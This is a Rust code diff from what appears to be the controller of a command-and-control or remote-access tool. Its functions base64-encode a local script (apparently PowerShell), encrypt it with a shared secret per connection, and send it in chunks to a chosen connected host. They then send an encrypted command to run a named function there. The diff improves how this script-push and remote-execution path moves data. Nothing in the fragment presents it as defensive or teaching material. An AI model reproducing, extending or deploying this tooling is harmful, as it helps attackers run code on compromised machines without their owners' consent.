@@ -45,19 +45,24 @@ pub async fn handle_importpsh(active_connections: &Arc<Mutex<HashMap<String, Con
     reader.read_to_end(&mut buffer).unwrap();
     let encoded_script = general_purpose::STANDARD.encode(&buffer);
 
-    let import_cmd = "||IMPORTSCRIPT|| ".to_owned();
+    let import_cmd = b"||IMPORTSCRIPT|| ";
     let (_, connection_info) = active_connections.iter().nth(id).unwrap();
     let stream = connection_info.stream.clone();
     let shared_secret = connection_info.shared_secret;
+    let encrypted_cmd = encrypt(import_cmd, &shared_secret).unwrap();
+    let combined_command = format!("{}", encoded_script);
 
-    let command = import_cmd;
-    let combined_command = format!("{}{} |!!done!!|", command, encoded_script);
-    let encrypted_command = encrypt(combined_command.as_bytes(), &shared_secret).expect("Failed to encrypt");
-    stream.lock().await.write(&encrypted_command).await.expect("Error writing to stream");
-
+    stream.lock().await.write(&encrypted_cmd).await.expect("Error writing to stream");
+    for chunk in combined_command.as_bytes().chunks(956) {
+        let encrypted_command = encrypt(chunk, &shared_secret).expect("Failed to encrypt");
+        stream.lock().await.write(&encrypted_command).await.expect("Error writing to stream");
+    }
+    stream.lock().await.write(&encrypt(b" |!!done!!|", &shared_secret).unwrap()).await.expect("Error writing to stream");
     stream.lock().await.flush().await.expect("Error flushing stream");
-    stream.lock().await.read(&mut buffer).await.expect("Error reading from stream");
-    let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
+
+    let mut message = [0; 1024];
+    stream.lock().await.read(&mut message).await.expect("Error reading from stream");
+    let data = decrypt(&message, &shared_secret).expect("Failed to decrypt");
     let response = match String::from_utf8(data) {
         Ok(response) => response,
         Err(_) => return Err("Error converting response to string".to_string()),
@@ -84,9 +89,6 @@ pub async fn handle_run_script(active_connections: &Arc<Mutex<HashMap<String, Co
     let stream = connection_info.stream.clone();
     let shared_secret = connection_info.shared_secret;
     let command = format!("||RUNSCRIPT|| {}", function_name);
-
-    timeout(Duration::from_secs(10), stream.lock().await
-    .read(&mut [0u8; 1024])).await.expect("failed timeout").unwrap();
 
     let encrypted_command = encrypt(command.as_bytes(), &shared_secret).expect("Failed to encrypt");
     stream.lock().await.write(&encrypted_command).await.expect("Error writing to stream");
